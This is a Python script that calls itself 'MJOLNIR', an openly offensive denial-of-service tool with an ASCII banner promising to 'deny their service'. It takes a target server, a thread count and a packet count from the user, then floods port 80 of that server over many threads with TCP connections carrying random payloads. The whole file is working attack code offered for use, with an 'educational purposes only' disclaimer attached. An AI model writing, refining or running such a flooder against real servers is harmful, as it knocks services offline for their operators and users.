import socket
import random
import string
import sys
import threading
import re
import signal
from concurrent.futures import ThreadPoolExecutor

# Function to handle "Ctrl+C" interruption and exit gracefully
def signal_handler(sig, frame):
    print("\nExiting...")
    sys.exit(0)

# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)

print('''
                        ░▓████▒░
                      ░▓████████▒░
                     ░▓████████████▓▒░
                   ░▒████████████████▓▒░
                   ░▒██████████████████▓▒░
                     ░▓██████████████████▓░
                       ░▓██████████████████▒░
                        ░▓██████████████████░
                        ░▒███████████████████░
                      ░▒████▓░▓████████████▓░
                    ░▒████▓░   ░▓████████▓░
                  ░▒████▓░       ░▓████▓░
                ░▒████▓░           ░▒▒░
              ░▒████▓░
            ░▒████▓░
        ░▒▓▒████▓░
      ░▒██████▓░
       ░▒█████░
         ░▒▓█░

███    ███      ██  ██████  ██      ███    ██ ██ ██████  
████  ████      ██ ██    ██ ██      ████   ██ ██ ██   ██ 
██ ████ ██      ██ ██    ██ ██      ██ ██  ██ ██ ██████  
██  ██  ██ ██   ██ ██    ██ ██      ██  ██ ██ ██ ██   ██ 
██      ██  █████   ██████  ███████ ██   ████ ██ ██   ██ 
                                                         
-Created by 0d1nss0n

-Deny their service with the full weight of the Ban Hammer
-This tool is for educational purposes only
-I am not responsible for any malicious use
 of this program
''')

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def send_packet(server, packet_size):
    try:
        server_ip = server if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", server) else socket.gethostbyname(server)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((server_ip, 80))
            packet = generate_random_string(packet_size).encode()
            client_socket.send(packet)
        print(f"Sent a {packet_size}-byte packet to {server}")
    except Exception as e:
        print(f"Error: {e}")

def get_packet_size_choice():
    while True:
        size_choice = input("Choose packet size (1. small 2.medium 3.large, or 'exit' to quit): ").lower()
        if size_choice == 'exit':
            sys.exit()
        elif size_choice in ["1", "2", "3"]:
            if size_choice == "1":
                return 64
            elif size_choice == "2":
                return 512
            elif size_choice == "3":
                return 1024
        else:
            print("Invalid choice. Please select from 1, 2, or 3.")

def get_num_packets():
    while True:
        try:
            num_packets = input("Enter the number of packets to send (or 'exit' to quit): ")
            if num_packets.lower() == 'exit':
                sys.exit()
            num_packets = int(num_packets)
            return num_packets
        except ValueError:
            print("Invalid input. Please enter a valid number.")

def stress_test():
    server = input("Enter the IP address or URL of the web server (or 'exit' to quit): ")
    if server.lower() == 'exit':
        sys.exit()

    packet_size = get_packet_size_choice()
    num_threads = int(input("Enter the number of threads to use (default is 1): "))
    num_packets = get_num_packets()

    print(f"Currently smashing {server} with {num_threads} threads and {num_packets} packets...")

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_packets):
            executor.submit(send_packet, server, packet_size)

if __name__ == "__main__":
    stress_test()
